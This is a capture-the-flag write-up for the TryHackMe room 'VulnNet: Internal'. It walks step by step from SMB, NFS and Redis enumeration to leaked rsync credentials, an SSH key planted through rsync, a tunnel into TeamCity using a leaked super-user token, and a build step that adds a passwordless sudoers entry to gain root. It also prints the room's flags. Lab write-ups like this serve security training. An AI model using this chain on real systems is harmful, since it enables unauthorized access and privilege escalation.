> Vulnet: Internal | Internal Services

# Nmap

nmap -sC -sV -A -Pn -vvv -p- $IP -oN nmap/full_scan

```bash

```

Let's start with SMB.

smbmap -H $IP

```bash
[+] Guest session   	IP: 10.10.57.247:445	Name: 10.10.57.247                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shares                                            	READ ONLY	VulnNet Business Shares
	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

smbmap -H $IP -u root -R

```bash

[+] Guest session   	IP: 10.10.57.247:445	Name: 10.10.57.247                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	shares                                            	READ ONLY	VulnNet Business Shares
	.\shares\*
	dr--r--r--                0 Tue Feb  2 04:20:09 2021	.
	dr--r--r--                0 Tue Feb  2 04:28:11 2021	..
	dr--r--r--                0 Sat Feb  6 06:45:10 2021	temp
	dr--r--r--                0 Tue Feb  2 04:27:33 2021	data
	.\shares\temp\*
	dr--r--r--                0 Sat Feb  6 06:45:10 2021	.
	dr--r--r--                0 Tue Feb  2 04:20:09 2021	..
	fr--r--r--               38 Sat Feb  6 06:45:09 2021	services.txt
	.\shares\data\*
	dr--r--r--                0 Tue Feb  2 04:27:33 2021	.
	dr--r--r--                0 Tue Feb  2 04:20:09 2021	..
	fr--r--r--               48 Tue Feb  2 04:21:18 2021	data.txt
	fr--r--r--              190 Tue Feb  2 04:27:33 2021	business-req.txt
	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

smbget -R smb://$IP/shares

# services.txt

```
THM{0a09d51e488f5fa105d8d866a497440a}
```

# NFS

showmount -e $IP

```bash
/opt/conf *
```

sudo mount -t nfs $IP:/opt/conf /tmp/mount/ -o nolock

```bash
hp
init
opt
profile.d
redis => I was interested in this cause we know we have redis server running
vim
wildmidi
```

# redis/redis.conf | grep pass

```bash
requirepass "B65Hx562F@ggAZ@F"
```

So we have password. Let's use redis-cli.

redis-cli -h $IP

```bash
> AUTH B65Hx562F@ggAZ@F
> INFO

# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:547
run_id:76f189596b318f688114f9d160899d823c8b1b0c
tcp_port:6379
uptime_in_seconds:2860
uptime_in_days:0
hz:10
lru_clock:11858881
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:842544
used_memory_human:822.80K
used_memory_rss:2867200
used_memory_rss_human:2.73M
used_memory_peak:842544
used_memory_peak_human:822.80K
used_memory_peak_perc:100.00%
used_memory_overhead:832358
used_memory_startup:782432
used_memory_dataset:10186
used_memory_dataset_perc:16.95%
total_system_memory:2087923712
total_system_memory_human:1.94G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:3.40
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1622468757
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:5
total_commands_processed:6
instantaneous_ops_per_sec:0
total_net_input_bytes:256
total_net_output_bytes:12065
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:0262d88c3db3a83cf3f96154f4749caa30e81b68
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.77
used_cpu_user:1.09
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=5,expires=0,avg_ttl=0 => Let us investigate this one

> SELECT 0

OK

> KEYS *

1) "internal flag"
2) "int"
3) "marketlist"
4) "tmp"
5) "authlist"

> type "internal flag"

string

> get "internal flag"

"THM{ff8e518addbbddb74531a724236a8221}"
```

And investigating further we got 

```bash
> type authlist
list
> lrange authlist 1 999999
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
```

We got some base64 encoded strings. Let's decode it and we got `Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v`.

# Rsync

Let's look for directory shares.

rsync -av --list-only rsync://$IP:873

```bash
files          	Necessary home interaction
```

rsync -av --list-only rsync://rsync-connect@$IP/files

And on entering the password we got a long list of files and we have our users file location `sys-internal/user.txt`.

rsync rsync://rsync-connect@$IP/files/sys-internal/user.txt user.txt

# users.txt

```
THM{da7c20696831f253e0afaca8b83c07ab}
```

Also we got .ssh folder but it's empty. I was referring Hacktricks for this whole room so it said we can upload files too. Let's create a pair of ssh key and get access.

rsync id_rsa.pub rsync://rsync-connect@10.10.57.247/files/sys-internal/.ssh/authorized_keys

ssh sys-internal@$IP -i id_rsa

And we are in as sys-internal. Actually I ran linpeas first and found some ports. And look at home dir. we can find /Teamcity folder. We can see that we are running Tomcat and Teamcity. Let's look at the logs and conf file.

cd TeamCity/logs/ && grep -R pass

```bash
catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
catalina.out:[TeamCity] Super user authentication token: 2112115144787772241 (use empty username with the token as the password to access the server)
```

Looks like we have to tunnel.

ssh -N -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@$IP

And we can now access locally at http://localhost:8111. 

# Credential

We have to try one by one.

` ` : `2112115144787772241`

And we are in!

# Steps

1. Click the create project
2. Click `Manually` and fill the fields.
3. Click on `Build Configuration` and fill in.
4. Click on `Build Steps`
5. Click `Command Line` in Runner type and add `echo "sys-internal  ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/sys-internal` in the custom script section and we can now login as root.

sudo su! We are root!!🎉🎉🎉🎉🎉

# root.txt

```
THM{e8996faea46df09dba5676dd271c60bd}
```